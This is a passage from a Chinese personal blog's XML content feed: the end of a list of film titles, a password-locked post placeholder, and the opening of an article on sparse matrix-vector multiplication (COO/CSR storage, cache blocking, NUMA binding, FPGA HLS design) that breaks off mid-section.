title="巨额来电"></a>巨额来电</h3></li><li><h3 id="帕丁顿熊2"><a href="#帕丁顿熊2" class="headerlink" title="帕丁顿熊2"></a>帕丁顿熊2</h3></li><li><h3 id="鲨海"><a href="#鲨海" class="headerlink" title="鲨海"></a>鲨海</h3></li><li><h3 id="奇门遁甲"><a href="#奇门遁甲" class="headerlink" title="奇门遁甲"></a>奇门遁甲</h3></li><li><h3 id="心理罪之城市之光"><a href="#心理罪之城市之光" class="headerlink" title="心理罪之城市之光"></a>心理罪之城市之光</h3></li><li><h3 id="芳华"><a href="#芳华" class="headerlink" title="芳华"></a>芳华</h3></li><li><h3 id="疯狂特警队"><a href="#疯狂特警队" class="headerlink" title="疯狂特警队"></a>疯狂特警队</h3></li><li><h3 id="妖猫传"><a href="#妖猫传" class="headerlink" title="妖猫传"></a>妖猫传</h3></li><li><h3 id="机器之血"><a href="#机器之血" class="headerlink" title="机器之血"></a>机器之血</h3></li><li><h3 id="妖铃铃"><a href="#妖铃铃" class="headerlink" title="妖铃铃"></a>妖铃铃</h3></li><li><h3 id="前任3：-再见前任"><a href="#前任3：-再见前任" class="headerlink" title="前任3： 再见前任"></a>前任3： 再见前任</h3></li><li><h3 id="二代妖精之今生有幸"><a href="#二代妖精之今生有幸" class="headerlink" title="二代妖精之今生有幸"></a>二代妖精之今生有幸</h3></li><li><h3 id="星球大战：最后的绝地武士"><a href="#星球大战：最后的绝地武士" class="headerlink" title="星球大战：最后的绝地武士"></a>星球大战：最后的绝地武士</h3></li><li><h3 id="勇敢者游戏：-决战丛林"><a href="#勇敢者游戏：-决战丛林" class="headerlink" title="勇敢者游戏： 决战丛林"></a>勇敢者游戏： 决战丛林</h3></li><li><h3 id="无问西东"><a href="#无问西东" class="headerlink" title="无问西东"></a>无问西东</h3></li><li><h3 id="谜巢"><a href="#谜巢" class="headerlink" title="谜巢"></a>谜巢</h3></li><li><h3 id="英雄本色2018"><a href="#英雄本色2018" class="headerlink" title="英雄本色2018"></a>英雄本色2018</h3></li><li><h3 id="神秘巨星"><a href="#神秘巨星" class="headerlink" title="神秘巨星"></a>神秘巨星</h3></li><li><h3 id="移动迷宫3：-死亡解药"><a href="#移动迷宫3：-死亡解药" class="headerlink" title="移动迷宫3： 死亡解药"></a>移动迷宫3： 死亡解药</h3></li><li><h3 id="绝命时钟2：22"><a href="#绝命时钟2：22" class="headerlink" title="绝命时钟2：22"></a>绝命时钟2：22</h3></li><li><h3 id="24小时：末路重生"><a href="#24小时：末路重生" class="headerlink" title="24小时：末路重生"></a>24小时：末路重生</h3></li><li><h3 id="忌日快乐"><a href="#忌日快乐" class="headerlink" title="忌日快乐"></a>忌日快乐</h3></li><li><h3 id="南极之恋"><a href="#南极之恋" class="headerlink" title="南极之恋"></a>南极之恋</h3></li><li><h3 id="唐人街探案2"><a href="#唐人街探案2" class="headerlink" title="唐人街探案2"></a>唐人街探案2</h3></li><li><h3 id="红海行动"><a href="#红海行动" class="headerlink" title="红海行动"></a>红海行动</h3></li><li><h3 id="捉妖记2"><a href="#捉妖记2" class="headerlink" title="捉妖记2"></a>捉妖记2</h3></li><li><h3 id="小萝莉的猴神大叔"><a href="#小萝莉的猴神大叔" class="headerlink" title="小萝莉的猴神大叔"></a>小萝莉的猴神大叔</h3></li><li><h3 id="黑豹"><a href="#黑豹" class="headerlink" title="黑豹"></a>黑豹</h3></li><li><h3 id="解忧杂货店"><a href="#解忧杂货店" class="headerlink" title="解忧杂货店"></a>解忧杂货店</h3></li><li><h3 id="古墓丽影：起源之战"><a href="#古墓丽影：起源之战" class="headerlink" title="古墓丽影：起源之战"></a>古墓丽影：起源之战</h3></li><li><h3 id="环太平洋：雷霆再起"><a href="#环太平洋：雷霆再起" class="headerlink" title="环太平洋：雷霆再起"></a>环太平洋：雷霆再起</h3></li><li><h3 id="头号玩家"><a href="#头号玩家" class="headerlink" title="头号玩家"></a>头号玩家</h3></li><li><h3 id="通勤营救"><a href="#通勤营救" class="headerlink" title="通勤营救"></a>通勤营救</h3></li><li><h3 id="起跑线"><a href="#起跑线" class="headerlink" title="起跑线"></a>起跑线</h3></li><li><h3 id="湮灭"><a href="#湮灭" class="headerlink" title="湮灭"></a>湮灭</h3></li><li><h3 id="脱单告急"><a href="#脱单告急" class="headerlink" title="脱单告急"></a>脱单告急</h3></li><li><h3 id="幕后玩家"><a href="#幕后玩家" class="headerlink" title="幕后玩家"></a>幕后玩家</h3></li><li><h3 id="后来的我们"><a href="#后来的我们" class="headerlink" title="后来的我们"></a>后来的我们</h3></li><li><h3 id="哆啦A梦：大雄的金银岛"><a href="#哆啦A梦：大雄的金银岛" class="headerlink" title="哆啦A梦：大雄的金银岛"></a>哆啦A梦：大雄的金银岛</h3></li><li><h3 id="复仇者联盟3：无限战争"><a href="#复仇者联盟3：无限战争" class="headerlink" title="复仇者联盟3：无限战争"></a>复仇者联盟3：无限战争</h3></li><li><h3 id="超时空同居"><a href="#超时空同居" class="headerlink" title="超时空同居"></a>超时空同居</h3></li><li><h3 id="游侠索罗：星球大战外传"><a href="#游侠索罗：星球大战外传" class="headerlink" title="游侠索罗：星球大战外传"></a>游侠索罗：星球大战外传</h3></li><li><h3 id="深海越狱"><a href="#深海越狱" class="headerlink" title="深海越狱"></a>深海越狱</h3></li><li><h3 id="侏罗纪世界2"><a href="#侏罗纪世界2" class="headerlink" title="侏罗纪世界2"></a>侏罗纪世界2</h3></li><li><h3 id="超人总动员2"><a href="#超人总动员2" class="headerlink" title="超人总动员2"></a>超人总动员2</h3></li><li><h3 id="龙虾刑警"><a href="#龙虾刑警" class="headerlink" title="龙虾刑警"></a>龙虾刑警</h3></li><li><h3 id="金蝉脱壳2"><a href="#金蝉脱壳2" class="headerlink" title="金蝉脱壳2"></a>金蝉脱壳2</h3></li><li><h3 id="我不是药神"><a href="#我不是药神" class="headerlink" title="我不是药神"></a>我不是药神</h3></li><li><h3 id="动物世界"><a href="#动物世界" class="headerlink" title="动物世界"></a>动物世界</h3></li><li><h3 id="邪不压正"><a href="#邪不压正" class="headerlink" title="邪不压正"></a>邪不压正</h3></li><li><h3 id="摩天营救"><a href="#摩天营救" class="headerlink" title="摩天营救"></a>摩天营救</h3></li><li><h3 id="西虹市首富"><a href="#西虹市首富" class="headerlink" title="西虹市首富"></a>西虹市首富</h3></li><li><h3 id="解码游戏"><a href="#解码游戏" class="headerlink" title="解码游戏"></a>解码游戏</h3></li><li><h3 id="爱情公寓"><a href="#爱情公寓" class="headerlink" title="爱情公寓"></a>爱情公寓</h3></li><li><h3 id="一出好戏"><a href="#一出好戏" class="headerlink" title="一出好戏"></a>一出好戏</h3></li><li><h3 id="快把我哥带走"><a href="#快把我哥带走" class="headerlink" title="快把我哥带走"></a>快把我哥带走</h3></li><li><h3 id="欧洲攻略"><a href="#欧洲攻略" class="headerlink" title="欧洲攻略"></a>欧洲攻略</h3></li><li><h3 id="蚁人2：黄蜂女现身"><a href="#蚁人2：黄蜂女现身" class="headerlink" title="蚁人2：黄蜂女现身"></a>蚁人2：黄蜂女现身</h3></li><li><h3 id="碟中谍6：全面瓦解"><a href="#碟中谍6：全面瓦解" class="headerlink" title="碟中谍6：全面瓦解"></a>碟中谍6：全面瓦解</h3></li><li><h3 id="阿尔法：狼伴归途"><a href="#阿尔法：狼伴归途" class="headerlink" title="阿尔法：狼伴归途"></a>阿尔法：狼伴归途</h3></li><li><h3 id="反贪风暴3"><a href="#反贪风暴3" class="headerlink" title="反贪风暴3"></a>反贪风暴3</h3></li><li><h3 id="影"><a href="#影" class="headerlink" title="影"></a>影</h3></li><li><h3 id="无双"><a href="#无双" class="headerlink" title="无双"></a>无双</h3></li><li><h3 id="李茶的姑妈"><a href="#李茶的姑妈" class="headerlink" title="李茶的姑妈"></a>李茶的姑妈</h3></li><li><h3 id="我的间谍前男友"><a href="#我的间谍前男友" class="headerlink" title="我的间谍前男友"></a>我的间谍前男友</h3></li><li><h3 id="铁血战士"><a href="#铁血战士" class="headerlink" title="铁血战士"></a>铁血战士</h3></li><li><h3 id="昨日青空"><a href="#昨日青空" class="headerlink" title="昨日青空"></a>昨日青空</h3></li><li><h3 id="毒液：致命守护者"><a href="#毒液：致命守护者" class="headerlink" title="毒液：致命守护者"></a>毒液：致命守护者</h3></li><li><h3 id="你好，之华"><a href="#你好，之华" class="headerlink" title="你好，之华"></a>你好，之华</h3></li><li><h3 id="冰封侠：时空行者"><a href="#冰封侠：时空行者" class="headerlink" title="冰封侠：时空行者"></a>冰封侠：时空行者</h3></li><li><h3 id="飓风奇劫"><a href="#飓风奇劫" class="headerlink" title="飓风奇劫"></a>飓风奇劫</h3></li><li><h3 id="名侦探柯南：-零的执行人"><a href="#名侦探柯南：-零的执行人" class="headerlink" title="名侦探柯南： 零的执行人"></a>名侦探柯南： 零的执行人</h3></li><li><h3 id="神奇动物：-格林德沃之罪"><a href="#神奇动物：-格林德沃之罪" class="headerlink" title="神奇动物： 格林德沃之罪"></a>神奇动物： 格林德沃之罪</h3></li><li><h3 id="无敌破坏王2：大闹互联网"><a href="#无敌破坏王2：大闹互联网" class="headerlink" title="无敌破坏王2：大闹互联网"></a>无敌破坏王2：大闹互联网</h3></li><li><h3 id="憨豆特工3"><a href="#憨豆特工3" class="headerlink" title="憨豆特工3"></a>憨豆特工3</h3></li><li><h3 id="无名之辈"><a href="#无名之辈" class="headerlink" title="无名之辈"></a>无名之辈</h3></li><li><h3 id="海王"><a href="#海王" class="headerlink" title="海王"></a>海王</h3></li><li><h3 id="龙猫"><a href="#龙猫" class="headerlink" title="龙猫"></a>龙猫</h3></li><li><h3 id="网络迷踪"><a href="#网络迷踪" class="headerlink" title="网络迷踪"></a>网络迷踪</h3></li><li><h3 id="天气预爆"><a href="#天气预爆" class="headerlink" title="天气预爆"></a>天气预爆</h3></li><li><h3 id="来电狂响"><a href="#来电狂响" class="headerlink" title="来电狂响"></a>来电狂响</h3></li><li><h3 id="蜘蛛侠：平行宇宙"><a href="#蜘蛛侠：平行宇宙" class="headerlink" title="蜘蛛侠：平行宇宙"></a>蜘蛛侠：平行宇宙</h3></li><li><h3 id="地球最后的夜晚"><a href="#地球最后的夜晚" class="headerlink" title="地球最后的夜晚"></a>地球最后的夜晚</h3></li><li><h3 id="大黄蜂"><a href="#大黄蜂" class="headerlink" title="大黄蜂"></a>大黄蜂</h3></li><li><h3 id="“大”人物"><a href="#“大”人物" class="headerlink" title="“大”人物"></a>“大”人物</h3></li><li><h3 id="命运之夜——天之杯：恶兆之花"><a href="#命运之夜——天之杯：恶兆之花" class="headerlink" title="命运之夜——天之杯：恶兆之花"></a>命运之夜——天之杯：恶兆之花</h3></li><li><h3 id="白蛇：缘起"><a href="#白蛇：缘起" class="headerlink" title="白蛇：缘起"></a>白蛇：缘起</h3></li><li><h3 id="密室逃生"><a href="#密室逃生" class="headerlink" title="密室逃生"></a>密室逃生</h3></li><li><h3 id="死侍2：我爱我家"><a href="#死侍2：我爱我家" class="headerlink" title="死侍2：我爱我家"></a>死侍2：我爱我家</h3></li><li><h3 id="掠食城市"><a href="#掠食城市" class="headerlink" title="掠食城市"></a>掠食城市</h3></li><li><h3 id="廉政风云4"><a href="#廉政风云4" class="headerlink" title="廉政风云4"></a>廉政风云4</h3></li><li><h3 id="流浪地球"><a href="#流浪地球" class="headerlink" title="流浪地球"></a>流浪地球</h3></li><li><h3 id="疯狂外星人"><a href="#疯狂外星人" class="headerlink" title="疯狂外星人"></a>疯狂外星人</h3></li><li><h3 id="飞驰人生"><a href="#飞驰人生" class="headerlink" title="飞驰人生"></a>飞驰人生</h3></li><li><h3 id="一吻定情"><a href="#一吻定情" class="headerlink" title="一吻定情"></a>一吻定情</h3></li><li><h3 id="阿丽塔：战斗天使"><a href="#阿丽塔：战斗天使" class="headerlink" title="阿丽塔：战斗天使"></a>阿丽塔：战斗天使</h3></li><li><h3 id="驯龙高手3"><a href="#驯龙高手3" class="headerlink" title="驯龙高手3"></a>驯龙高手3</h3></li><li><h3 id="惊奇队长"><a href="#惊奇队长" class="headerlink" title="惊奇队长"></a>惊奇队长</h3></li><li><h3 id="过春天"><a href="#过春天" class="headerlink" title="过春天"></a>过春天</h3></li><li><h3 id="比悲伤更悲伤的故事"><a href="#比悲伤更悲伤的故事" class="headerlink" title="比悲伤更悲伤的故事"></a>比悲伤更悲伤的故事</h3></li><li><h3 id="波西米亚狂想曲"><a href="#波西米亚狂想曲" class="headerlink" title="波西米亚狂想曲"></a>波西米亚狂想曲</h3></li><li><h3 id="乐高大电影2"><a href="#乐高大电影2" class="headerlink" title="乐高大电影2"></a>乐高大电影2</h3></li><li><h3 id="海市蜃楼"><a href="#海市蜃楼" class="headerlink" title="海市蜃楼"></a>海市蜃楼</h3></li><li><h3 id="反贪风暴4"><a href="#反贪风暴4" class="headerlink" title="反贪风暴4"></a>反贪风暴4</h3></li><li><h3 id="风中有朵雨做的云"><a href="#风中有朵雨做的云" class="headerlink" title="风中有朵雨做的云"></a>风中有朵雨做的云</h3></li><li><h3 id="雷霆沙赞！"><a href="#雷霆沙赞！" class="headerlink" title="雷霆沙赞！"></a>雷霆沙赞！</h3></li><li><h3 id="复仇者联盟4：-终局之战"><a href="#复仇者联盟4：-终局之战" class="headerlink" title="复仇者联盟4： 终局之战"></a>复仇者联盟4： 终局之战</h3></li><li><h3 id="祈祷落幕时"><a href="#祈祷落幕时" class="headerlink" title="祈祷落幕时"></a>祈祷落幕时</h3></li><li><h3 id="调音师"><a href="#调音师" class="headerlink" title="调音师"></a>调音师</h3></li><li><h3 id="何以为家"><a href="#何以为家" class="headerlink" title="何以为家"></a>何以为家</h3></li><li><h3 id="大侦探皮卡丘"><a href="#大侦探皮卡丘" class="headerlink" title="大侦探皮卡丘"></a>大侦探皮卡丘</h3></li><li><h3 id="阿拉丁"><a href="#阿拉丁" class="headerlink" title="阿拉丁"></a>阿拉丁</h3></li><li><h3 id="哥斯拉2：怪兽之王"><a href="#哥斯拉2：怪兽之王" class="headerlink" title="哥斯拉2：怪兽之王"></a>哥斯拉2：怪兽之王</h3></li><li><h3 id="哆啦A梦：大雄的月球探险"><a href="#哆啦A梦：大雄的月球探险" class="headerlink" title="哆啦A梦：大雄的月球探险"></a>哆啦A梦：大雄的月球探险</h3></li><li><h3 id="X战警：黑凤凰"><a href="#X战警：黑凤凰" class="headerlink" title="X战警：黑凤凰"></a>X战警：黑凤凰</h3></li><li><h3 id="追龙II"><a href="#追龙II" class="headerlink" title="追龙II"></a>追龙II</h3></li><li><h3 id="绝杀慕尼黑"><a href="#绝杀慕尼黑" class="headerlink" title="绝杀慕尼黑"></a>绝杀慕尼黑</h3></li><li><h3 id="秦明·生死语者"><a href="#秦明·生死语者" class="headerlink" title="秦明·生死语者"></a>秦明·生死语者</h3></li><li><h3 id="黑衣人：全球追缉"><a href="#黑衣人：全球追缉" class="headerlink" title="黑衣人：全球追缉"></a>黑衣人：全球追缉</h3></li><li><h3 id="玩具总动员4"><a href="#玩具总动员4" class="headerlink" title="玩具总动员4"></a>玩具总动员4</h3></li><li><h3 id="千与千寻"><a href="#千与千寻" class="headerlink" title="千与千寻"></a>千与千寻</h3></li><li><h3 id="蜘蛛侠：英雄远征"><a href="#蜘蛛侠：英雄远征" class="headerlink" title="蜘蛛侠：英雄远征"></a>蜘蛛侠：英雄远征</h3></li><li><h3 id="扫毒2：天地对决"><a href="#扫毒2：天地对决" class="headerlink" title="扫毒2：天地对决"></a>扫毒2：天地对决</h3></li><li><h3 id="爱宠大机密2"><a href="#爱宠大机密2" class="headerlink" title="爱宠大机密2"></a>爱宠大机密2</h3></li><li><h3 id="哪吒之魔童降世"><a href="#哪吒之魔童降世" class="headerlink" title="哪吒之魔童降世"></a>哪吒之魔童降世</h3></li><li><h3 id="烈火英雄"><a href="#烈火英雄" class="headerlink" title="烈火英雄"></a>烈火英雄</h3></li><li><h3 id="使徒行者2：碟影行动"><a href="#使徒行者2：碟影行动" class="headerlink" title="使徒行者2：碟影行动"></a>使徒行者2：碟影行动</h3></li><li><h3 id="沉默的证人"><a href="#沉默的证人" class="headerlink" title="沉默的证人"></a>沉默的证人</h3></li><li><h3 id="全职高手之巅峰荣耀"><a href="#全职高手之巅峰荣耀" class="headerlink" title="全职高手之巅峰荣耀"></a>全职高手之巅峰荣耀</h3></li><li><h3 id="愤怒的小鸟2"><a href="#愤怒的小鸟2" class="headerlink" title="愤怒的小鸟2"></a>愤怒的小鸟2</h3></li><li><h3 id="铤而走险"><a href="#铤而走险" class="headerlink" title="铤而走险"></a>铤而走险</h3></li><li><h3 id="罗小黑战记"><a href="#罗小黑战记" class="headerlink" title="罗小黑战记"></a>罗小黑战记</h3></li><li><h3 id="检察方的罪人"><a href="#检察方的罪人" class="headerlink" title="检察方的罪人"></a>检察方的罪人</h3></li><li><h3 id="宝莱坞机器人2-0：重生归来"><a href="#宝莱坞机器人2-0：重生归来" class="headerlink" title="宝莱坞机器人2.0：重生归来"></a>宝莱坞机器人2.0：重生归来</h3></li><li><h3 id="罗小黑战记-1"><a href="#罗小黑战记-1" class="headerlink" title="罗小黑战记"></a>罗小黑战记</h3></li><li><h3 id="名侦探柯南：绀青之拳"><a href="#名侦探柯南：绀青之拳" class="headerlink" title="名侦探柯南：绀青之拳"></a>名侦探柯南：绀青之拳</h3></li><li><h3 id="诛仙I"><a href="#诛仙I" class="headerlink" title="诛仙I"></a>诛仙I</h3></li><li><h3 id="小Q"><a href="#小Q" class="headerlink" title="小Q"></a>小Q</h3></li><li><h3 id="友情以上"><a href="#友情以上" class="headerlink" title="友情以上"></a>友情以上</h3></li><li><h3 id="中国机长"><a href="#中国机长" class="headerlink" title="中国机长"></a>中国机长</h3></li><li><h3 id="我和我的祖国"><a href="#我和我的祖国" class="headerlink" title="我和我的祖国"></a>我和我的祖国</h3></li><li><h3 id="攀登者"><a href="#攀登者" class="headerlink" title="攀登者"></a>攀登者</h3></li><li><h3 id="犯罪现场"><a href="#犯罪现场" class="headerlink" title="犯罪现场"></a>犯罪现场</h3></li><li><h3 id="航海王：狂热行动"><a href="#航海王：狂热行动" class="headerlink" title="航海王：狂热行动"></a>航海王：狂热行动</h3></li><li><h3 id="双子杀手"><a href="#双子杀手" class="headerlink" title="双子杀手"></a>双子杀手</h3></li><li><h3 id="沉睡魔咒2"><a href="#沉睡魔咒2" class="headerlink" title="沉睡魔咒2"></a>沉睡魔咒2</h3></li><li><h3 id="少年的你"><a href="#少年的你" class="headerlink" title="少年的你"></a>少年的你</h3></li><li><h3 id="天气之子"><a href="#天气之子" class="headerlink" title="天气之子"></a>天气之子</h3></li><li><h3 id="终结者：黑暗命运"><a href="#终结者：黑暗命运" class="headerlink" title="终结者：黑暗命运"></a>终结者：黑暗命运</h3></li><li><h3 id="受益人"><a href="#受益人" class="headerlink" title="受益人"></a>受益人</h3></li><li></li><li></li></ul>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>Magic</title>
      <link href="/2019/05/20/Magic/"/>
      <url>/2019/05/20/Magic/</url>
      
        <content type="html"><![CDATA[<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script><div id="hbe-security">  <div class="hbe-input-container">  <input type="password" class="hbe-form-control" id="pass" placeholder="Welcome to my blog, enter password to read." />    <label for="pass">Welcome to my blog, enter password to read.</label>    <div class="bottom-line"></div>  </div></div><div id="decryptionError" style="display: none;">Incorrect Password!</div><div id="noContentError" style="display: none;">No content to display!</div><div id="encrypt-blog" style="display:none"></div><script src="/lib/crypto-js.js"></script><script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
      
      
      <categories>
          
          <category> Magic </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>SpMV</title>
      <link href="/2019/05/19/SpMV/"/>
      <url>/2019/05/19/SpMV/</url>
      
        <content type="html"><![CDATA[<h1 id="稀疏矩阵向量乘"><a href="#稀疏矩阵向量乘" class="headerlink" title="稀疏矩阵向量乘"></a>稀疏矩阵向量乘</h1><blockquote><p>本文参考: </p><p><a href="http://kns.cnki.net/KCMS/detail/detail.aspx?dbcode=CDFD&amp;dbname=CDFD1214&amp;filename=1011303506.nh&amp;uid=WEEvREcwSlJHSldRa1FhdkJkVG1BSEZmNDlLQ1Bla1NraUFEc2lQeFp5cz0=$9A4hF_YAuvQ5obgVAqNKPCYcEjKensW4IQMovwHtwkF4VYPoHbKxJw!!&amp;v=MzIwNTk4ZVgxTHV4WVM3RGgxVDNxVHJXTTFGckNVUkxPZll1ZHBGeUhuVTd2TlZGMjZIN0M0SGRUTXFaRWJQSVI=" target="_blank" rel="noopener">FPGA矩阵计算并行算法与结构(知网)</a></p><p><a href="https://xupsh.github.io/pp4fpgas-cn/06-Sparse-Matrix-Vector-Multiplication.html" target="_blank" rel="noopener">稀疏矩阵向量乘法xFPGA</a></p><p><a href="http://book.51cto.com/art/201506/480986.htm" target="_blank" rel="noopener">稀疏矩阵向量乘法x并行编程方法</a></p><p><a href="https://www.cnblogs.com/xbinworld/p/4273506.html" target="_blank" rel="noopener">稀疏矩阵存储格式总结</a></p><p><a href="https://mp.weixin.qq.com/s/ZrQd2avGTRsHMxj4wRA3gw" target="_blank" rel="noopener">深度学习FPGA加速器设计</a></p></blockquote><p>在矩阵中，若数值为0的元素数目远远多于非0元素的数目，并且非0元素分布没有规律时，则称该矩阵为稀疏矩阵；与之相反，若非0元素数目占大多数时，则称该矩阵为稠密矩阵。定义非零元素的总数比上矩阵所有元素的总数为矩阵的稠密度。<br>SpMV即 Sparse Matrix Vector Multiplication</p><h2 id="稀疏矩阵向量乘法的优化"><a href="#稀疏矩阵向量乘法的优化" class="headerlink" title="稀疏矩阵向量乘法的优化"></a>稀疏矩阵向量乘法的优化</h2><p>稀疏矩阵向量乘法（SPMV）可在很多情况下代替稠密矩阵运算，可以大量节省内存占用，减少计算开销。矩阵向量乘法不同于矩阵和矩阵的乘法，这是完全访存密集型的计算，我们主要的优化方向是提升访存效率或减少访存开销。</p><p>稀疏矩阵一般只存储非零元的信息，非零元的存储格式决定了访存的模式，这需要根据非零元的分布模式和要做的计算类型来设计。我们假设分布模式并非对角线分布，整体分布较均匀，局部可能会有聚集，计算类型是稀疏矩阵乘以稠密向量，结果为稠密向量。</p><p>标准的稀疏矩阵存储格式主要有：COO（Coordinate Format）和CSR（Compressed Sparse Row）等。COO很简单，就是使用3个数组，分别存储全部非零元的行下标（row index）、列下标（column index）和值（value）；CSR稍复杂，对行下标进行了压缩，假设矩阵行数是m，则压缩后的数组长度为m+1，记作（row ptr），其中第i个元素（0-base）表示矩阵前i行的非零元个数。</p><p>图1-1和图1-2展示了COO和CSR格式存储稀疏矩阵的一个例子。</p><p><a href="http://s8.51cto.com/wyfs02/M02/6E/B9/wKioL1WD-rnzJXs6AAAoveikjls134.jpg" target="_blank" rel="noopener"><img src="http://s8.51cto.com/wyfs02/M02/6E/B9/wKioL1WD-rnzJXs6AAAoveikjls134.jpg" alt="img"></a></p><p>我们来考虑矩阵向量乘法计算y=Ax，其中A是稀疏矩阵，维度是m和n，非零元个数是k；x和y是稠密向量，维度分别是n和m，m×n &gt;&gt; k &gt;&gt; max(m, n)。做这个稀疏矩阵向量乘法就要遍历A的每一行，和x对应位置相乘，把结果累加到y的对应位置。这个过程对A的k个非零元全部访问了一遍，对x也访问了k个元素（重叠），对y访问了一遍，所以优化重点在于减少访问A的冗余，并提升访问x的效率。下面这几个优化标准稀疏矩阵存储格式的方法，可以提升访存效率，减少冗余。</p><p><a href="http://s2.51cto.com/wyfs02/M00/6E/B9/wKioL1WD-r7BqYmdAAB38WzGMbw735.jpg" target="_blank" rel="noopener"><img src="http://s2.51cto.com/wyfs02/M00/6E/B9/wKioL1WD-r7BqYmdAAB38WzGMbw735.jpg" alt="img"></a></p><p>（1）对矩阵A做行列分块处理</p><p>对x的访问每次总是从左到右进行稀疏的遍历，如果n很大（比如上百万甚至更多），则访问x的空间局部性较差。所以我们首先改进矩阵A的访问顺序，将矩阵A分解成多个方形的子矩阵。子矩阵的维度适应较高层CPU硬件cache的大小，这样在遍历每一个子矩阵时，对x的访问相对集中于一个较小的区间，这个区间内的x会被cache缓存，这样能够大大提高访问效率。分块方式如图1-3所示。</p><p><a href="http://s2.51cto.com/wyfs02/M00/6E/BD/wKiom1WD-RLR2LssAABQf6mXvLM286.jpg" target="_blank" rel="noopener"><img src="http://s2.51cto.com/wyfs02/M00/6E/BD/wKiom1WD-RLR2LssAABQf6mXvLM286.jpg" alt="img"></a></p><p>（2）自适应分块存储结构</p><p>由于稀疏矩阵的非零元分布不一定均匀，有的分块会非常稀疏，有的则会相对稠密。对于极稀疏的分块（非零元数量远小于行数），如果用和CSR相似的压缩行存储策略，则会浪费空间，所以用COO的方式反而更能节省存储空间，提高访问效率。</p><p>对于哪些分块使用CSR，哪些使用COO方式，可以通过实验的方式确定一个非零元的数量和分块大小的比值。高于该值的用CSR方式存储，否则用COO方式存储。</p><p>如图1-4所示，一共使用5个数组存储自适应分块信息的稀疏矩阵，灰色的部分是CSR的相关信息，白色的部分是COO的相关信息。col_idx和vals的意义不变；types存储分块类型，标识当前分块是CSR还是COO；如果当前分块是CSR，则row_info存储类似row_ptr的信息（第k个元素表示分块内第k行的非零元个数），否则存储COO的row_idx的信息；row_id存储每个分块在row_info上的起始地址。</p><p><a href="http://s5.51cto.com/wyfs02/M01/6E/B9/wKioL1WD-svwE_vyAABKDw_Pvok868.jpg" target="_blank" rel="noopener"><img src="http://s5.51cto.com/wyfs02/M01/6E/B9/wKioL1WD-svwE_vyAABKDw_Pvok868.jpg" alt="img"></a></p><p>（3）减少下标存储的冗余</p><p>矩阵分块后，分块内间址的下标并不需要4字节int型整数存储，比如分块维度在64K以内，可以用2字节的unsigned short来存储。这样，无论是CSR或COO的row_idx、row_ptr，还是col_idx，都可以减少50%的存储空间，并同时提升访存效率。</p><p>（4）多线程和NUMA特性</p><p>单处理器多核多线程并行计算稀疏矩阵向量乘的过程比较简单，只需把矩阵划分成线程数量的子矩阵。这里采用横切的方法，计算结果不用合并。</p><p>但是对于多处理器非一致内存访问（NUMA），就需要对数据在内存中的分布做特殊处理，才能最大程度地利用全部的内存带宽。</p><p>一个典型的Intel X86双路服务器的拓扑架构如图1-5所示。</p><p>Memory #0是CPU #0的本地内存，Memory #1是CPU #1的本地内存，它们有各自独立的内存带宽。CPU #0访问Memory #1需要经过内部总线（在Intel的架构中叫QPI总线），这个总线的带宽一般小于内存带宽。另外如果要访问的数据只集中在一颗CPU的本地内存中，那么只能利用一个NUMA node的内存带宽，这就限制了系统的总体吞吐。</p><p>所以需要把稀疏矩阵的存储均匀地分配到两颗处理器各自的本地内存中。对于一个双CPU，每颗CPU一共4核的系统，需要开8个线程，并把这8个线程分别绑定到8颗CPU核上，使线程的上下文不会在核间迁移。对于每个线程要处理的稀疏矩阵数据，也通过系统调用（在Linux中是mbind），绑定到所在CPU核的本地内存中。这样每个核处理的数据一定是从本地内存中获得的，不会经过QPI总线。这就最大程度地利用了系统内存的带宽。经过实测，这个优化方法可以提升70%左右的内存带宽。</p><p><a href="http://s6.51cto.com/wyfs02/M02/6E/B9/wKioL1WD-uDTARvAAAB3790aG0s198.jpg" target="_blank" rel="noopener"><img src="http://s6.51cto.com/wyfs02/M02/6E/B9/wKioL1WD-uDTARvAAAB3790aG0s198.jpg" alt="img"></a></p><p>对于我们测试的一个维度大约1M、稀疏度0.0001的稀疏矩阵来说，所有优化加起来，相对Intel MKL库中CSR矩阵的SpMV API加速了2.5x左右。学术界还有很多针对稀疏矩阵存储格式的讨论和研究，其中有些还利用了SIMD向量指令，这里介绍的稀疏矩阵乘法方法，更多是为了讨论内存和cache优化的一些基本原理。稀疏矩阵根据稀疏度和非零元分布的不同，需要使用不同的存储策略，所以遇到实际的稀疏矩阵问题，需要根据实际情况开发不同的存储格式。</p><h2 id="FPGA上的稀疏矩阵向量乘稀疏矩阵向量乘法"><a href="#FPGA上的稀疏矩阵向量乘稀疏矩阵向量乘法" class="headerlink" title="FPGA上的稀疏矩阵向量乘稀疏矩阵向量乘法"></a>FPGA上的稀疏矩阵向量乘稀疏矩阵向量乘法</h2><p>稀疏矩阵向量乘（<strong>SpMV</strong>）把一个稀疏矩阵与一个向量相乘。稀疏矩阵是指矩阵中大部分元素为0的矩阵。这里的向量本身也可是稀疏的，但通常情况下是密集的。作为一种通用的运算，在科学应用、经济模型、数据挖掘、信息检索中广泛应用。例如，在利用迭代法求解稀疏线性方程组和特征值的问题。同时，也被应用于网页搜索排名和计算机视觉（图像重构等）。</p><p>本章会引入几个与HLS相关的新概念，并进一步深入之前讨论过的优化。本章的目标之一是引入一种更复杂的数据结构。我们用压缩行存储（CRS）来保存稀疏矩阵。另一个目标是演示如何进行性能测试。我们编写了简单的激励用来检验设计是否正确。这在硬件设计中十分重要，<strong>Vivado®HLS</strong> 工具采用HLS C编写激励，并能轻松的对工具生成的RTL代码进行多方面的验证。这是基于HLS设计比基于RTL设计的巨大优势之一。章节中也会讲解如何采用Vivado®HLS工具进行C/RTL联合仿真。不同<strong>SpMV</strong>设计会带来性能上差异，因为执行时间和稀疏矩阵是密切相关的，所以我们必须通过输入数据来确定任务执行之间的间隔以及任务延迟。</p><h3 id="6-1-背景"><a href="#6-1-背景" class="headerlink" title="6.1 背景"></a>6.1 背景</h3><p>图6.1显示了一个4x4的矩阵M表示的2种方式。其中图6.1-a采用通用的二维方式16个元素来表示矩阵，每个元素存储在自己对应的位置上。图<strong>6.1</strong>-b采用<strong>CRS</strong>的方式表示相同的矩阵。<strong>CRS</strong> 